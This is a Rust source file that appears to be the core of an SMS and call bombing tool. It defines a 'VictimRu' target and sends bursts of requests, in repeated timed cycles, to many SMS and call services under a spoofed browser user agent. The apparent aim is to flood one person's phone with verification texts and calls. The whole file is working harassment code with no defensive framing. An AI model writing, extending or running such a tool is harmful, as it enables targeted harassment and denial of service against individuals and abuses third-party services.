use crate::services::{BodyType, Service, Services, VictimRu};
use futures::future::join_all;
use reqwest::{Client, Method};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

const SERVICES_DELAY: u64 = 15;
const CALL_SERVICES_DELAY: u64 = 30;

pub async fn single(service: Service, stop_flag: Arc<AtomicBool>) {
    let stop_flag_clone = stop_flag.clone();

    if !stop_flag_clone.load(Ordering::Relaxed) {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
            .default_headers(service.headers)
            .build()
            .expect("");

        let mut res;
        match service.method {
            Method::GET => res = client.get(service.url),
            Method::POST => res = client.post(service.url),
            _ => panic!("Unsupported method"),
        }
        match service.body_type {
            BodyType::JSON => res = res.json(&service.body),
            BodyType::Form => res = res.form(&service.body),
        }

        println!("Starting {}", service.name);
        let res = res.send().await.expect("");
        println!(
            "{} {}\n{}\n",
            service.name,
            res.status(),
            res.text().await.unwrap()
        );
    } else {
        println!("Stopped send {}", service.name);
    }
}

pub trait Send {
    async fn send(&self, cycles: u64, stop_flag: Arc<AtomicBool>);
}

impl Send for VictimRu {
    async fn send(&self, cycles: u64, stop_flag: Arc<AtomicBool>) {
        stop_flag.store(false, Ordering::Relaxed);
        let mut workers = Vec::new();

        let victim_clone = self.clone();
        let stop_flag_clone = stop_flag.clone();
        workers.push(tokio::spawn(async move {
            for i in 0..cycles {
                let mut services = victim_clone.sms();
                services.extend(victim_clone.services());
                let futures: Vec<_> = services
                    .into_iter()
                    .map(|item| tokio::spawn(single(item, stop_flag_clone.clone())))
                    .collect();

                join_all(futures).await;

                if i < cycles - 1 && !stop_flag_clone.load(Ordering::Relaxed) {
                    tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
                }
            }
        }));

        let victim_clone = self.clone();
        let stop_flag_clone = stop_flag.clone();
        workers.push(tokio::spawn(async move {
            for i in 0..cycles {
                let services = victim_clone.calls();
                let call_services_futures: Vec<_> = services
                    .into_iter()
                    .map(|item| {
                        let stop_flag_clone = stop_flag.clone();
                        async move {
                            single(item, stop_flag_clone.clone()).await;
                            if !stop_flag_clone.load(Ordering::Relaxed) {
                                tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
                            }
                        }
                    })
                    .collect();

                for call_services_handle in call_services_futures {
                    call_services_handle.await;
                }

                if i < cycles - 1 && !stop_flag_clone.load(Ordering::Relaxed) {
                    tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
                }
            }
        }));

        join_all(workers).await;
    }
}
